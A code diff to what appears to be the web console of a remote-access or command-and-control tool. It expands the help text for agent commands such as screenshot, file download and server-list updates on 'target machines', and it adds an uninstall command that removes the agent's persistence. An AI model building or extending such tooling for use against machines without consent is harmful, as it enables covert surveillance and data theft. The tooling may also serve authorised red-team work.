@@ -566,10 +566,11 @@ const HELP = `<span style="color:var(--cyan)">Available commands:</span>
   <span style="color:var(--green)">screenshot</span>          — capture screenshot
   <span style="color:var(--green)">sysinfo</span>             — system information
   <span style="color:var(--green)">dir</span> [path]          — list directory
-  <span style="color:var(--green)">download</span> &lt;path&gt;     — download file
-  <span style="color:var(--green)">servers</span> &lt;uri...&gt;   — update server list
-  <span style="color:var(--green)">select</span> &lt;id&gt;         — select agent
-  <span style="color:var(--green)">list</span>                — list agents
+  <span style="color:var(--green)">download</span> &lt;path&gt;     — download file from agent
+  <span style="color:var(--green)">servers</span> &lt;uri...&gt;   — push new server list to agent
+  <span style="color:var(--green)">select</span> &lt;id&gt;         — select agent (prefix ok)
+  <span style="color:var(--green)">list</span>                — list online agents
+  <span style="color:var(--green)">uninstall</span>           — remove agent from target machine
   <span style="color:var(--green)">clear</span>               — clear terminal
   <span style="color:var(--green)">help</span>                — this help`;
 
@@ -655,6 +656,19 @@ async function termSend() {
       if (!args.length) { termPrint('Usage: servers <uri> [<uri>...]', 'err'); return; }
       const res = await sendCmd('update_servers', {servers: args});
       termPrint(`Server list updated: ${res.servers?.join(', ')}`, 'success');
+    }
+    else if (verb === 'uninstall') {
+      const host = S.clients[S.selected]?.hostname || S.selected?.slice(0,8);
+      termPrint(`⚠ Uninstalling agent on ${host} ...`, 'info');
+      const res = await sendCmd('uninstall', {}, 15000);
+      if (res.persistence_removed === false) {
+        termPrint(`Persistence removal failed: ${res.persistence_error || '?'}`, 'err');
+      } else {
+        termPrint(`✓ Persistence removed`, 'success');
+      }
+      termPrint(`✓ ${res.message || 'Agent is shutting down and removing itself.'}`, 'success');
+      S.selected = null;
+      updatePrompt();
     }
     else {
       termPrint(`Unknown command: ${verb}. Type 'help'`, 'err');
